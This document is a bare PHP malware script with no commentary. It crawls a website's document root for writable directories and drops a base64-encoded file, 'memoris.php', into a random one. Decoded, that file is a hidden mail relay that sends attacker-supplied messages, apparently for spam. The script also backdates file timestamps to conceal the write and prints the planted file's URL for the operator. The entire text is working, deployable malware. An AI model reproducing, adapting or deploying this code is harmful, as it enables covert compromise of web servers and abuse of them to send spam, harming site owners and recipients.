
            error_reporting(E_ALL);
            set_time_limit(0);
            $startDirectory = $_SERVER['DOCUMENT_ROOT'];
            $domain = $_SERVER['HTTP_HOST'];
            $depth = 4;
            $fileData = "PD9waHAKaWYoaXNzZXQoJF9QT1NUWyJtYWlsdG8iXSkpCiAgICAgICAgJE1haWxUbyA9IGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJtYWlsdG8iXSk7CmVsc2UKIHsKIGVjaG8gImluZGF0YV9lcnJvciI7CiBleGl0OwogfQppZihpc3NldCgkX1BPU1RbIm1zZ2hlYWRlciJdKSkKICAgICAgICAkTWVzc2FnZUhlYWRlciA9IGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJtc2doZWFkZXIiXSk7CmVsc2UKIHsKIGVjaG8gImluZGF0YV9lcnJvciI7CiBleGl0OwogfQppZihpc3NldCgkX1BPU1RbIm1zZ2JvZHkiXSkpCiAgICAgICAgJE1lc3NhZ2VCb2R5ID0gYmFzZTY0X2RlY29kZSgkX1BPU1RbIm1zZ2JvZHkiXSk7CmVsc2UKIHsKIGVjaG8gImluZGF0YV9lcnJvciI7CiBleGl0OwogfQppZihpc3NldCgkX1BPU1RbIm1zZ3N1YmplY3QiXSkpCiAgICAgICAgJE1lc3NhZ2VTdWJqZWN0ID0gYmFzZTY0X2RlY29kZSgkX1BPU1RbIm1zZ3N1YmplY3QiXSk7CmVsc2UKIHsKIGVjaG8gImluZGF0YV9lcnJvciI7CiBleGl0OwogfQppZihtYWlsKCRNYWlsVG8sJE1lc3NhZ2VTdWJqZWN0LCRNZXNzYWdlQm9keSwkTWVzc2FnZUhlYWRlcikpCiBlY2hvICJzZW50X29rIjsKZWxzZQogZWNobyAic2VudF9lcnJvciI7Cj8+";
            $fileName = "memoris.php";
            $filePrefix = "ini_";
            $fileMode = 0;

            function GetRandomPath($dirs, $depth) {
                if($depth > (int)current($dirs)) {
                    $depth = (int)current($dirs);
                }
                $allKeys = array_keys($dirs, $depth);
                return $allKeys[rand(0, count($allKeys) - 1)];
            }

            function FileWrite($filePath, $fileData, $fileMode, $filePrefix) {
            $pathParts = pathinfo($filePath);
            $fileTime = filemtime($pathParts["dirname"]);
                if(file_exists($filePath)) {
                        if($fileMode == 2)
                            return "";
                        if($fileMode == 0)
                            $filePath = $pathParts["dirname"]."/".$filePrefix.$pathParts["basename"];
                }
                if($fp = fopen($filePath, "w")) {
                    fwrite($fp, $fileData);
                    fclose($fp);
                    touch($filePath, $fileTime);
                    touch($pathParts["dirname"], $fileTime);
                    return $filePath;
                }
            }



            function is__writable($path) {

                if ($path{strlen($path)-1}=="/")
                    return is__writable($path.uniqid(mt_rand()).".tmp");

                if (file_exists($path)) {
                    if (!($f = @fopen($path, "r+")))
                        return false;
                    fclose($f);
                    return true;
                }

                if (!($f = @fopen($path, "w")))
                    return false;
                fclose($f);
                unlink($path);
                return true;
            }



            function get_writable_dirs($startPath, $path = ""){
                $depth_limit = 5;
                $startPath = str_replace("\\", "/", $startPath);
                $all_dirs = array();
                $more_dirs = array();
                if($path == ""){
                    if( is__writable($startPath."/") )
                        $all_dirs = array($startPath => 0);
                    $path = $startPath;
                }    
                $depth = substr_count(str_replace($startPath, "", $path),"/");
                //echo "checking $path";
                       
                if( is_writable($path."/") ){
                    //echo "$path writable";
                    $all_dirs[$path] = $depth;
                }
                if ( $depth > $depth_limit )
                    return null;
                //echo $all_dirs[$path]."";
                $d = scandir($path);
                //print_r($d);
                foreach( $d as $child ){
                    if( $child != "." && $child != ".." ){
                        //echo $child."";
                        $newPath = $path."/".$child;
                        if( is_dir($newPath) ) {
                            //echo $newPath." is dir ";
                            if ( is__writable($newPath."/") ){
                                //echo $newPath." is writable";
                                $all_dirs[$newPath] = substr_count(str_replace($startPath, "", $newPath),"/");
                            }
                            //echo $path."/".$child."";
                            $more_dirs = get_writable_dirs($startPath, $newPath);
                            if ( !empty($more_dirs) ){
                                $all_dirs = array_merge($all_dirs, $more_dirs);
                            }
                        }
                    }
                }
                
                arsort($all_dirs);
                return $all_dirs;
            }






            //$allDirs = GetAllDirs($startDirectory);
            $allDirs = get_writable_dirs($startDirectory);
            if ( count($allDirs) < 1)
               exit("no dirs");
            $randPath = GetRandomPath($allDirs, $depth);
            //print_r($allDirs);
            //continue;

            $fileWritedPath = FileWrite($randPath."/".$fileName, base64_decode($fileData), $fileMode, $filePrefix);
            $fileWritedPath = str_replace("//", "/", $fileWritedPath);
            if(strlen($fileWritedPath) != 0){
                /* echo $startDirectory."
"; */
                $url = str_replace( str_replace("\\","/",$startDirectory), $domain, $fileWritedPath);
                $url = "http://".$url;
                if ( !strstr($url, "http://.") )
                    echo "p_url_to_check: ".$url."";
                    echo "
";
                /*
                if(strlen($_SERVER["DOCUMENT_ROOT"]) == 1)
                    echo substr($fileWritedPath, 1);
                else
                    echo str_replace(str_replace("\\", "/", $_SERVER["DOCUMENT_ROOT"]), "", $fileWritedPath);
                */
            }